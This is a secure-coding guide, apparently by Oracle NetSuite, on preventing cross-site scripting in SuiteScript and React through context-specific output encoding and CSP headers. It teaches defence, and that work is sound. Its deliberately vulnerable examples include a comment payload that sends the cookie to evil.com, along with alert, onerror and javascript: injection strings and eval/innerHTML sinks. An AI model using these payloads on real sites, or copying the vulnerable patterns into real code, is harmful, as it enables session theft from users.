Copyright (c) 2026 Oracle and/or its affiliates.
Licensed under the Universal Permissive License v1.0 as shown at
[The Universal Permissive License (UPL), Version 1.0](https://oss.oracle.com/licenses/upl).

# XSS Prevention & Output Encoding (A03:2021)
> Author: Oracle NetSuite

**Note:** XSS is not a standalone OWASP Top 10 (2021) category; it is commonly addressed under A03:2021 - Injection, alongside other injection flaws.


## Overview

Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a webpage without proper validation or escaping. XSS allows attackers to execute scripts in
the victim's browser, hijack sessions, deface websites, or redirect users. In NetSuite,
XSS risks are highest in Suitelets that generate HTML, custom portlet scripts, and
client scripts that manipulate the DOM.

**OWASP Reference:** [A03:2021 - Injection](https://owasp.org/Top10/A03_2021-Injection/).

---

## 1. Reflected XSS in Suitelets

Reflected XSS occurs when user input from the request is immediately included in the
response HTML without encoding.

### Example 1: Basic Reflected XSS

```javascript
// ===== BAD: User input reflected directly into HTML =====
/**
 * @NApiVersion 2.1
 * @NScriptType Suitelet
 */
define([], () => {
    const onRequest = (context) => {
        const name = context.request.parameters.name;

        // VULNERABLE: If name = <script>document.location='https://evil.com/steal?c='+document.cookie</script>
        // the script executes in the user's browser
        context.response.write(`<html><body><h1>Hello, ${name}!</h1></body></html>`);
    };

    return { onRequest };
});
```

```javascript
// ===== GOOD: HTML-encode all user input before embedding in HTML =====
/**
 * @NApiVersion 2.1
 * @NScriptType Suitelet
 */
define([], () => {

    const escapeHtml = (str) => {
        if (str == null) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    };

    const onRequest = (context) => {
        const name = context.request.parameters.name;

        // SAFE: HTML entities are rendered as text, not executed as markup
        context.response.write(`<html><body><h1>Hello, ${escapeHtml(name)}!</h1></body></html>`);
    };

    return { onRequest };
});
```

### Example 2: Using N/ui/serverWidget (Preferred Approach)

```javascript
// ===== GOOD: Use serverWidget forms instead of raw HTML =====
/**
 * @NApiVersion 2.1
 * @NScriptType Suitelet
 */
define(['N/ui/serverWidget'], (serverWidget) => {
    const onRequest = (context) => {
        const form = serverWidget.createForm({ title: 'Customer Greeting' });
        const name = context.request.parameters.name || '';

        // serverWidget handles encoding internally
        const field = form.addField({
            id: 'custpage_greeting',
            type: serverWidget.FieldType.INLINEHTML,
            label: 'Greeting'
        });

        // Still encode when using INLINEHTML; it renders raw HTML by design
        const escapeHtml = (s) => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;')
            .replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;');

        field.defaultValue = `<h1>Hello, ${escapeHtml(name)}!</h1>`;

        context.response.writePage(form);
    };

    return { onRequest };
});
```

> **Important:** `serverWidget.FieldType.INLINEHTML` renders raw HTML. You must still
> encode user-supplied data placed into INLINEHTML fields. Use `FieldType.TEXT` or
> `FieldType.TEXTAREA` for automatically safe text display.

---

## 2. Stored XSS via Record Fields

Stored XSS occurs when malicious input is saved to a record and later displayed to
other users without encoding.

### Example 3: Stored XSS in Custom Record Fields

```javascript
// ===== BAD: Displaying record data without encoding =====
define(['N/record'], (record) => {
    const onRequest = (context) => {
        const rec = record.load({ type: 'customrecord_feedback', id: 1 });
        const feedback = rec.getValue({ fieldId: 'custrecord_feedback_text' });

        // VULNERABLE: If a user previously saved <script>alert('xss')</script>
        // as their feedback, it executes for everyone viewing this page
        context.response.write(`<html><body><div class="feedback">${feedback}</div></body></html>`);
    };
});
```

```javascript
// ===== GOOD: Encode stored data before rendering =====
define(['N/record'], (record) => {

    const escapeHtml = (str) => {
        if (str == null) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    };

    const onRequest = (context) => {
        const rec = record.load({ type: 'customrecord_feedback', id: 1 });
        const feedback = rec.getValue({ fieldId: 'custrecord_feedback_text' });

        // SAFE: Stored content is encoded before rendering
        context.response.write(
            `<html><body><div class="feedback">${escapeHtml(feedback)}</div></body></html>`
        );
    };
});
```

---

## 3. DOM-Based XSS

DOM-based XSS occurs entirely in the browser when client-side JavaScript writes
untrusted data to the DOM.

### Example 4: innerHTML with Untrusted Data

```javascript
// ===== BAD: Using innerHTML with URL parameters =====
/**
 * @NApiVersion 2.1
 * @NScriptType ClientScript
 */
define([], () => {
    const pageInit = () => {
        // VULNERABLE: URL fragment is attacker-controlled
        const params = new URLSearchParams(window.location.search);
        const message = params.get('msg');

        // innerHTML parses and executes any HTML/script content
        document.getElementById('notification').innerHTML = message;

        // Also vulnerable: document.write(), outerHTML, insertAdjacentHTML
    };

    return { pageInit };
});
```

```javascript
// ===== GOOD: Use textContent or innerText for untrusted data =====
/**
 * @NApiVersion 2.1
 * @NScriptType ClientScript
 */
define([], () => {
    const pageInit = () => {
        const params = new URLSearchParams(window.location.search);
        const message = params.get('msg');

        // SAFE: textContent treats everything as plain text, no HTML parsing
        document.getElementById('notification').textContent = message;
    };

    return { pageInit };
});
```

### Example 5: eval() and Similar Sinks

```javascript
// ===== BAD: eval with user-controlled input =====
define([], () => {
    const pageInit = () => {
        const action = new URLSearchParams(window.location.search).get('action');

        // VULNERABLE: Direct code execution from user input
        eval(action);

        // Also dangerous:
        // new Function(action)();
        // setTimeout(action, 100);   // string form
        // setInterval(action, 1000); // string form
    };
});
```

```javascript
// ===== GOOD: Use an allowlist of actions, never eval =====
define([], () => {
    const actions = {
        refresh: () => window.location.reload(),
        scrollTop: () => window.scrollTo(0, 0),
        togglePanel: () => {
            const panel = document.getElementById('detail-panel');
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        }
    };

    const pageInit = () => {
        const action = new URLSearchParams(window.location.search).get('action');

        // SAFE: Only predefined actions can execute
        if (action && actions[action]) {
            actions[action]();
        }
    };

    return { pageInit };
});
```

---

## 4. Context-Specific Output Encoding

Different HTML contexts require different encoding strategies. Using the wrong encoding
for a context provides no protection.

### The Five Encoding Contexts

| Context          | Example Location                       | Encoding Required       |
|------------------|----------------------------------------|-------------------------|
| HTML Body        | `<div>USER_DATA</div>`                 | HTML entity encoding    |
| HTML Attribute   | `<input value="USER_DATA">`            | Attribute encoding      |
| JavaScript       | `<script>var x = 'USER_DATA';</script>`| JavaScript encoding     |
| URL Parameter    | `<a href="/page?q=USER_DATA">`         | URL/percent encoding    |
| CSS              | `<div style="color: USER_DATA">`       | CSS hex encoding        |

### Example 6: Encoding for HTML Attributes

```javascript
// ===== BAD: Unencoded data in HTML attribute =====
define([], () => {
    const onRequest = (context) => {
        const userTitle = context.request.parameters.title;

        // VULNERABLE: userTitle = '" onmouseover="alert(1)" data-x="'
        // renders as: <div title="" onmouseover="alert(1)" data-x="">
        context.response.write(`<div title="${userTitle}">Content</div>`);
    };
});
```

```javascript
// ===== GOOD: Attribute encoding (encode all non-alphanumeric chars) =====
define([], () => {

    const encodeForAttribute = (str) => {
        if (str == null) return '';
        return String(str).replace(/[^a-zA-Z0-9 ]/g, (char) => {
            return `&#x${char.charCodeAt(0).toString(16).padStart(2, '0')};`;
        });
    };

    const onRequest = (context) => {
        const userTitle = context.request.parameters.title;

        // SAFE: Special characters are encoded as HTML hex entities
        context.response.write(`<div title="${encodeForAttribute(userTitle)}">Content</div>`);
    };
});
```

### Example 7: Encoding for JavaScript Context

```javascript
// ===== BAD: User data embedded in a script block =====
define([], () => {
    const onRequest = (context) => {
        const username = context.request.parameters.user;

        // VULNERABLE: user = "'; alert('xss'); //'"
        // Results in: var user = ''; alert('xss'); //''
        context.response.write(`
            <script>
                var user = '${username}';
                console.log('Welcome, ' + user);
            </script>
        `);
    };
});
```

```javascript
// ===== GOOD: Use JSON.stringify for JavaScript context or pass data via data attributes =====
define([], () => {

    const escapeHtml = (str) => {
        if (str == null) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    };

    const onRequest = (context) => {
        const username = context.request.parameters.user;

        // APPROACH 1: JSON.stringify produces a safe JS string literal
        // (handles quotes, backslashes, and special characters)
        const safeJsString = JSON.stringify(username);

        context.response.write(`
            <script>
                var user = ${safeJsString};
                console.log('Welcome, ' + user);
            </script>
        `);

        // APPROACH 2 (preferred): Pass data via data attributes, read with textContent
        context.response.write(`
            <div id="user-data" data-user="${escapeHtml(username)}" style="display:none;"></div>
            <script>
                var user = document.getElementById('user-data').getAttribute('data-user');
                console.log('Welcome, ' + user);
            </script>
        `);
    };
});
```

### Example 8: URL Encoding

```javascript
// ===== BAD: Unencoded user input in URL =====
define([], () => {
    const onRequest = (context) => {
        const searchTerm = context.request.parameters.q;

        // VULNERABLE: searchTerm could contain javascript: protocol or break out of href
        context.response.write(`<a href="/search?q=${searchTerm}">Search again</a>`);
    };
});
```

```javascript
// ===== GOOD: Use encodeURIComponent for URL parameters =====
define([], () => {

    const escapeHtml = (str) => {
        if (str == null) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    };

    const onRequest = (context) => {
        const searchTerm = context.request.parameters.q;

        // SAFE: encodeURIComponent handles the URL context,
        // then escapeHtml handles the HTML attribute context
        const safeUrl = `/search?q=${encodeURIComponent(searchTerm)}`;
        context.response.write(`<a href="${escapeHtml(safeUrl)}">Search again</a>`);
    };
});
```

---

## 5. SuiteScript N/encode Module

NetSuite's `N/encode` module provides encoding utilities, but note that it is designed
for data format conversion (Base64, hex), not for XSS prevention.

### Example 9: Correct Use of N/encode

```javascript
// ===== BAD: Misusing N/encode for XSS prevention =====
define(['N/encode'], (encode) => {
    const onRequest = (context) => {
        const userInput = context.request.parameters.data;

        // WRONG: Base64 encoding does NOT prevent XSS.
        // The browser does not decode Base64 in HTML context,
        // but this is not a security control; it's data corruption.
        const encoded = encode.convert({
            string: userInput,
            inputEncoding: encode.Encoding.UTF_8,
            outputEncoding: encode.Encoding.BASE_64
        });

        context.response.write(`<div>${encoded}</div>`);
    };
});
```

```javascript
// ===== GOOD: Use dedicated HTML escaping for XSS, N/encode for data format conversion =====
define(['N/encode'], (encode) => {

    // Purpose-built HTML escaping function
    const escapeHtml = (str) => {
        if (str == null) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    };

    const onRequest = (context) => {
        const userInput = context.request.parameters.data;

        // Use escapeHtml for XSS prevention
        context.response.write(`<div>${escapeHtml(userInput)}</div>`);

        // Use N/encode for legitimate data format conversion (for example, sending binary data)
        const base64Data = encode.convert({
            string: userInput,
            inputEncoding: encode.Encoding.UTF_8,
            outputEncoding: encode.Encoding.BASE_64
        });
        // base64Data can be safely used in JSON payloads, not HTML rendering
    };
});
```

---

## 6. Content Security Policy (CSP) as Defense-in-Depth

CSP is an HTTP header that restricts which resources the browser can load. It serves
as a second line of defense if XSS encoding is missed.

### Example 10: Adding CSP Headers to Suitelets

```javascript
// ===== BAD: No CSP header; browser loads any script from any source =====
define([], () => {
    const onRequest = (context) => {
        context.response.write('<html><body>My App</body></html>');
        // No CSP header means injected scripts run freely
    };
});
```

```javascript
// ===== GOOD: Strict CSP that blocks inline scripts and external sources =====
define([], () => {
    const onRequest = (context) => {
        // Set Content-Security-Policy header
        context.response.setHeader({
            name: 'Content-Security-Policy',
            value: [
                "default-src 'self'",          // Default: only same-origin
                "script-src 'self'",            // Scripts: only same-origin (blocks inline)
                "style-src 'self' 'unsafe-inline'", // Styles: same-origin + inline (for NS UI)
                "img-src 'self' data:",         // Images: same-origin + data URIs
                "frame-ancestors 'self'",       // Prevent clickjacking
                "form-action 'self'",           // Forms can only submit to same origin
                "base-uri 'self'"               // Prevent base tag injection
            ].join('; ')
        });

        // Also set supplementary security headers
        context.response.setHeader({
            name: 'X-Content-Type-Options',
            value: 'nosniff'
        });

        context.response.write('<html><body>My App</body></html>');
    };
});
```

> **Note:** NetSuite's own UI relies on inline scripts and certain CDN domains. A strict
> CSP may break standard NetSuite functionality. Test CSP policies thoroughly in sandbox
> before deploying to production. Consider using `Content-Security-Policy-Report-Only`
> first to monitor violations without blocking.

---

## 7. React/JSX Auto-Escaping and dangerouslySetInnerHTML

If building custom UIs with React (common in SuiteCommerce Advanced), understand
its auto-escaping behavior and the risks of bypassing it.

### Example 11: React XSS via dangerouslySetInnerHTML

```jsx
// ===== BAD: Using dangerouslySetInnerHTML with untrusted data =====
function UserProfile({ bio }) {
    // VULNERABLE: If bio contains <img src=x onerror=alert(1)>, it executes
    return <div dangerouslySetInnerHTML={{ __html: bio }} />;
}
```

```jsx
// ===== GOOD: Let React auto-escape, or sanitize if HTML is required =====
// Option 1: Use React's default behavior (auto-escapes)
function UserProfile({ bio }) {
    // SAFE: React auto-escapes all string content in JSX
    return <div>{bio}</div>;
}

// Option 2: If you MUST render HTML, sanitize with DOMPurify
import DOMPurify from 'dompurify';

function UserProfile({ bio }) {
    // SAFE: DOMPurify removes all dangerous HTML, keeping safe formatting
    const cleanBio = DOMPurify.sanitize(bio, {
        ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],
        ALLOWED_ATTR: []
    });
    return <div dangerouslySetInnerHTML={{ __html: cleanBio }} />;
}
```

### Example 12: Href Attribute XSS in React

```jsx
// ===== BAD: User-controlled href can use javascript: protocol =====
function UserLink({ url, label }) {
    // VULNERABLE: url = "javascript:alert(document.cookie)"
    // React does NOT block javascript: in href attributes
    return <a href={url}>{label}</a>;
}
```

```jsx
// ===== GOOD: Validate URL protocol before rendering =====
function UserLink({ url, label }) {
    const isSafeUrl = (u) => {
        try {
            const parsed = new URL(u);
            return ['http:', 'https:', 'mailto:'].includes(parsed.protocol);
        } catch {
            return false;
        }
    };

    // SAFE: Only render the link if the URL uses an allowed protocol
    const href = isSafeUrl(url) ? url : '#';

    return <a href={href}>{label}</a>;
}
```

---

## 8. Encoding Utility Library

For consistency across a SuiteScript project, create a shared encoding module.

### Example 13: Reusable Encoding Module

```javascript
/**
 * @NApiVersion 2.1
 * @NModuleScope Public
 * @module ./lib/encoding
 */
define([], () => {

    /**
     * HTML body context encoding.
     * Safe for: <div>ENCODED_VALUE</div>
     */
    const forHtml = (str) => {
        if (str == null) return '';
        return String(str)
            .replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#x27;');
    };

    /**
     * HTML attribute context encoding.
     * Safe for: <input value="ENCODED_VALUE">
     * Encodes all non-alphanumeric characters as hex entities.
     */
    const forAttribute = (str) => {
        if (str == null) return '';
        return String(str).replace(/[^a-zA-Z0-9 ]/g, (char) => {
            return `&#x${char.charCodeAt(0).toString(16).padStart(2, '0')};`;
        });
    };

    /**
     * JavaScript string context encoding.
     * Safe for: <script>var x = 'ENCODED_VALUE';</script>
     * Uses JSON.stringify which handles all special JS characters.
     */
    const forJavaScript = (str) => {
        if (str == null) return '""';
        // JSON.stringify produces a quoted, escaped string
        return JSON.stringify(String(str));
    };

    /**
     * URL parameter context encoding.
     * Safe for: <a href="/page?q=ENCODED_VALUE">
     */
    const forUrl = (str) => {
        if (str == null) return '';
        return encodeURIComponent(String(str));
    };

    /**
     * CSS context encoding.
     * Safe for: <div style="background: ENCODED_VALUE">
     * Encodes all non-alphanumeric characters as CSS hex escapes.
     */
    const forCss = (str) => {
        if (str == null) return '';
        return String(str).replace(/[^a-zA-Z0-9]/g, (char) => {
            return `\\${char.charCodeAt(0).toString(16).padStart(6, '0')} `;
        });
    };

    return {
        forHtml,
        forAttribute,
        forJavaScript,
        forUrl,
        forCss
    };
});
```

Usage:

```javascript
define(['./lib/encoding'], (enc) => {
    const onRequest = (context) => {
        const name = context.request.parameters.name;
        const query = context.request.parameters.q;

        const html = `
            <div title="${enc.forAttribute(name)}">
                <h1>${enc.forHtml(name)}</h1>
                <a href="/search?q=${enc.forUrl(query)}">Search</a>
                <script>var username = ${enc.forJavaScript(name)};</script>
            </div>
        `;
        context.response.write(html);
    };
});
```

---

## Prevention Checklist

- [ ] **All user input** is encoded before embedding in HTML responses.
- [ ] **Encoding is context-appropriate** (HTML body, attribute, JS, URL, CSS).
- [ ] **serverWidget** is preferred over raw HTML for Suitelet forms.
- [ ] **INLINEHTML fields** still encode user data (they render raw HTML).
- [ ] **Client scripts** use `textContent` instead of `innerHTML` for untrusted data.
- [ ] **eval(), new Function(), setTimeout(string)** are never used with user input.
- [ ] **CSP headers** are set as defense-in-depth.
- [ ] **X-Content-Type-Options: nosniff** header is present.
- [ ] **React components** never use `dangerouslySetInnerHTML` with unsanitized data.
- [ ] **URL href attributes** validate the protocol against an allowlist.
- [ ] **Stored data** from records is encoded on output, not just validated on input.
- [ ] **A shared encoding library** ensures consistent escaping across the project.
- [ ] **Template engines** are configured with auto-escaping enabled by default.
- [ ] **N/encode** is used for data format conversion, NOT for XSS prevention.

---

## Related OWASP Resources

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP DOM-Based XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP Content Security Policy Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [CWE-79: Cross-Site Scripting](https://cwe.mitre.org/data/definitions/79.html)
- [CWE-116: Improper Encoding or Escaping of Output](https://cwe.mitre.org/data/definitions/116.html)
